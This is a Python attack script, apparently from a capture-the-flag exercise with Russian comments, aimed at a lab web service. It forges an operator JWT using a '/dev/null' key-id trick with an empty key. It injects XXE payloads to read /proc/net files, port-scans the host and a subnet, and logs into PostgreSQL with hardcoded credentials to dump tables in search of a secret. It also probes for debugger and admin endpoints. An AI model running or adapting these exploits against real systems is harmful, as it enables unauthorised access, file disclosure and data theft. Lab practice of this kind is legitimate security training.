#!/usr/bin/env python3
"""round49 — Direct PostgreSQL, port scan, /proc/net/tcp, Werkzeug debugger, gauge-gw direct"""
import requests, socket, time, json, hmac as hm, hashlib, base64, struct, subprocess

CASPI = "http://192.168.242.102:8007"
HOST = "192.168.242.102"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: /proc/net/tcp — ВСЕ ПОРТЫ И СОЕДИНЕНИЯ")
print("="*70)

def decode_addr(hex_addr):
    """Decode hex address from /proc/net/tcp"""
    ip_hex, port_hex = hex_addr.split(':')
    # IP is in little-endian hex
    ip_int = int(ip_hex, 16)
    ip = socket.inet_ntoa(struct.pack('<I', ip_int))
    port = int(port_hex, 16)
    return ip, port

st, val = xxe_read("/proc/net/tcp")
if st == "OK" and val:
    lines = val.strip().split('\n')
    print(f"  {len(lines)} TCP записей")

    listening = []
    established = []

    for line in lines[1:]:  # Skip header
        parts = line.split()
        if len(parts) >= 4:
            try:
                local_ip, local_port = decode_addr(parts[1])
                remote_ip, remote_port = decode_addr(parts[2])
                state_hex = parts[3]

                states = {'01': 'ESTABLISHED', '02': 'SYN_SENT', '06': 'TIME_WAIT',
                          '0A': 'LISTEN', '08': 'CLOSE_WAIT', '05': 'CLOSE',
                          '03': 'SYN_RECV', '04': 'FIN_WAIT1', '07': 'CLOSE',
                          '09': 'LAST_ACK', '0B': 'CLOSING'}
                state = states.get(state_hex, state_hex)

                if state == 'LISTEN':
                    listening.append((local_ip, local_port))
                elif state == 'ESTABLISHED':
                    established.append((local_ip, local_port, remote_ip, remote_port))
            except:
                pass

    print("\n  СЛУШАЮЩИЕ ПОРТЫ:")
    for ip, port in sorted(listening, key=lambda x: x[1]):
        print(f"    {ip}:{port}")

    print(f"\n  УСТАНОВЛЕННЫЕ СОЕДИНЕНИЯ ({len(established)}):")
    for lip, lp, rip, rp in established[:20]:
        print(f"    {lip}:{lp} -> {rip}:{rp}")

# IPv6
st, val = xxe_read("/proc/net/tcp6")
if st == "OK" and val:
    lines = val.strip().split('\n')
    print(f"\n  TCP6: {len(lines)} записей")
    # Только показываем если есть LISTEN
    for line in lines[1:]:
        parts = line.split()
        if len(parts) >= 4 and parts[3] == '0A':
            print(f"    LISTEN: {parts[1]}")

# UDP
st, val = xxe_read("/proc/net/udp")
if st == "OK" and val:
    lines = val.strip().split('\n')
    if len(lines) > 1:
        print(f"\n  UDP: {len(lines)-1} записей")
        for line in lines[1:5]:
            print(f"    {line.strip()[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: СКАНИРОВАНИЕ ПОРТОВ 192.168.242.102 С КАЛИ")
print("="*70)

# Быстрый TCP connect scan наиболее вероятных портов
ports_to_scan = [
    21, 22, 23, 25, 53, 80, 111, 135, 139, 389, 443, 445, 465, 514,
    587, 636, 993, 995, 1080, 1433, 1521, 2049, 2181, 2375, 2376,
    3000, 3306, 3389, 4369, 5000, 5432, 5672, 5900, 5984,
    6379, 6443, 7474, 8000, 8007, 8008, 8080, 8081, 8443, 8888,
    9000, 9042, 9090, 9100, 9200, 9300, 9443, 9999,
    10000, 11211, 15672, 27017, 27018, 28017,
    50000, 50070, 50075, 61616,
]

open_ports = []
print(f"  Сканируем {len(ports_to_scan)} портов на {HOST}...")

for port in ports_to_scan:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        result = sock.connect_ex((HOST, port))
        if result == 0:
            open_ports.append(port)
            # Попробуем получить баннер
            try:
                sock.settimeout(2.0)
                banner = sock.recv(1024)
                print(f"  [OPEN] :{port}  banner={banner[:100]!r}")
            except:
                print(f"  [OPEN] :{port}")
        sock.close()
    except:
        pass

if not open_ports:
    print("  Ни один порт не открыт (кроме 8007)")
else:
    print(f"\n  Открытые порты: {open_ports}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: ПРЯМОЕ ПОДКЛЮЧЕНИЕ К POSTGRESQL")
print("="*70)

# Пробуем подключиться к PostgreSQL на разных хостах/портах
pg_targets = [
    (HOST, 5432),           # Прямой доступ к хосту
    ("172.18.0.3", 5432),   # Docker internal (если маршрут есть)
    (HOST, 5433),           # Альтернативный порт
    (HOST, 5434),
]

for pg_host, pg_port in pg_targets:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        result = sock.connect_ex((pg_host, pg_port))
        if result == 0:
            print(f"\n  [OPEN] PostgreSQL на {pg_host}:{pg_port}")
            sock.close()

            # Пробуем psql
            try:
                result = subprocess.run(
                    ["psql", f"postgresql://terminal_web:terminal_web_pw@{pg_host}:{pg_port}/terminal",
                     "-c", "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename;"],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    print(f"  PSQL РАБОТАЕТ!")
                    print(result.stdout[:2000])

                    # Теперь ищем PROBE_SECRET
                    for query in [
                        "SELECT * FROM pg_tables WHERE schemaname='public';",
                        "SELECT column_name, table_name FROM information_schema.columns WHERE table_schema='public';",
                        "SELECT * FROM config LIMIT 10;",
                        "SELECT * FROM settings LIMIT 10;",
                        "SELECT * FROM secrets LIMIT 10;",
                        "SELECT * FROM probe_config LIMIT 10;",
                        "SELECT * FROM devices LIMIT 10;",
                        "SELECT * FROM users LIMIT 5;",
                    ]:
                        try:
                            r = subprocess.run(
                                ["psql", f"postgresql://terminal_web:terminal_web_pw@{pg_host}:{pg_port}/terminal",
                                 "-c", query],
                                capture_output=True, text=True, timeout=10
                            )
                            if r.returncode == 0 and r.stdout.strip():
                                print(f"\n  {query}")
                                print(r.stdout[:1000])
                        except:
                            pass
                else:
                    print(f"  psql ошибка: {result.stderr[:200]}")
            except FileNotFoundError:
                print("  psql не установлен. Пробуем Python psycopg2...")
                try:
                    import psycopg2
                    conn = psycopg2.connect(
                        host=pg_host, port=pg_port,
                        dbname="terminal", user="terminal_web", password="terminal_web_pw",
                        connect_timeout=5
                    )
                    cur = conn.cursor()
                    cur.execute("SELECT tablename FROM pg_tables WHERE schemaname='public'")
                    tables = [r[0] for r in cur.fetchall()]
                    print(f"  ПОДКЛЮЧЕНИЕ УСПЕШНО! Таблицы: {tables}")

                    # Дамп всех таблиц
                    for table in tables:
                        cur.execute(f"SELECT * FROM {table} LIMIT 10")
                        cols = [d[0] for d in cur.description]
                        rows = cur.fetchall()
                        print(f"\n  === {table} ({len(rows)} rows) ===")
                        print(f"  Columns: {cols}")
                        for row in rows:
                            print(f"    {row}")

                    # Ищем probe_secret
                    for q in ["SELECT * FROM config", "SELECT * FROM settings",
                              "SELECT * FROM probe_config", "SELECT * FROM secrets"]:
                        try:
                            cur.execute(q)
                            print(f"\n  {q}: {cur.fetchall()}")
                        except:
                            conn.rollback()

                    conn.close()
                except ImportError:
                    print("  psycopg2 не установлен")
                except Exception as e:
                    print(f"  Ошибка подключения: {e}")
        else:
            sock.close()
    except Exception as e:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: WERKZEUG DEBUGGER / CONSOLE")
print("="*70)

werkzeug_paths = [
    "/console",
    "/__debugger__",
    "/_debug",
    "/debug",
    "/werkzeug",
    "/werkzeug-debug",
    # Flask internal
    "/_internal",
    "/_flask",
    # Swagger / API docs
    "/swagger",
    "/swagger.json",
    "/api/swagger.json",
    "/openapi.json",
    "/api/openapi.json",
    "/docs",
    "/api/docs",
    "/redoc",
    # Admin
    "/admin",
    "/admin/",
    "/flask-admin",
    # Prometheus metrics
    "/metrics",
    "/prometheus",
]

for path in werkzeug_paths:
    try:
        r = S.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            print(f"\n  [{r.status_code}] {path}:")
            print(f"  {r.text[:300]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: GAUGE-GW DIRECT ACCESS")
print("="*70)

# Может gauge-gw доступен напрямую?
for port in [9100, 80, 8080, 8000, 3000]:
    try:
        r = requests.get(f"http://{HOST}:{port}/", timeout=3)
        print(f"  [HTTP {r.status_code}] {HOST}:{port}: {r.text[:200]}")
    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [{HOST}:{port}] {e}")

# gauge-gw.internal — может резолвиться?
try:
    ip = socket.gethostbyname("gauge-gw.internal")
    print(f"\n  gauge-gw.internal resolves to {ip}")
except:
    print(f"\n  gauge-gw.internal не резолвится с Kali")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: ДРУГИЕ ХОСТЫ НА 192.168.242.0/24")
print("="*70)

# Быстрый ping-sweep ближайших IP
print("  Сканируем 192.168.242.100-110 на порт 80,8080,8007,5432,9100...")
for ip_suffix in range(100, 111):
    target = f"192.168.242.{ip_suffix}"
    for port in [80, 8080, 8007, 5432, 9100]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"  [OPEN] {target}:{port}")
            sock.close()
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: НЕИССЛЕДОВАННЫЕ СТРАНИЦЫ")
print("="*70)

# Полный контент /services
try:
    r = S.get(f"{CASPI}/services", headers=AUTH_OP, timeout=5)
    print(f"  /services [{r.status_code}] ({len(r.text)} bytes)")
    # Ищем интересное
    import re
    urls = re.findall(r'href=[\'"]([^\'"]+)[\'"]', r.text)
    unique_urls = sorted(set(urls))
    if unique_urls:
        print("  URLs in /services:")
        for u in unique_urls:
            if u.startswith('/'):
                print(f"    {u}")
except Exception as e:
    print(f"  Error: {e}")

# /portal с operator JWT
try:
    r = S.get(f"{CASPI}/portal", headers=AUTH_OP, timeout=5)
    print(f"\n  /portal [{r.status_code}] ({len(r.text)} bytes)")
    if r.status_code == 200:
        # Ищем API вызовы и скрытые ссылки
        urls = re.findall(r'href=[\'"]([^\'"]+)[\'"]', r.text)
        api_calls = re.findall(r'fetch\([\'"]([^\'"]+)[\'"]', r.text)
        for u in sorted(set(urls)):
            if u.startswith('/') and u not in ['/', '/services', '/login', '/register', '/ops', '/portal']:
                print(f"    href: {u}")
        for a in api_calls:
            print(f"    fetch: {a}")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: HOME PAGE — СКРЫТЫЕ ССЫЛКИ")
print("="*70)

try:
    r = S.get(f"{CASPI}/", headers=AUTH_OP, timeout=5)
    print(f"  / [{r.status_code}] ({len(r.text)} bytes)")
    urls = re.findall(r'href=[\'"]([^\'"]+)[\'"]', r.text)
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
    unique = sorted(set(urls))
    for u in unique:
        if u.startswith('/'):
            print(f"    {u}")
    if scripts:
        for i, s in enumerate(scripts):
            if len(s.strip()) > 0:
                print(f"\n  Script {i+1}: {s.strip()[:300]}")
except Exception as e:
    print(f"  Error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
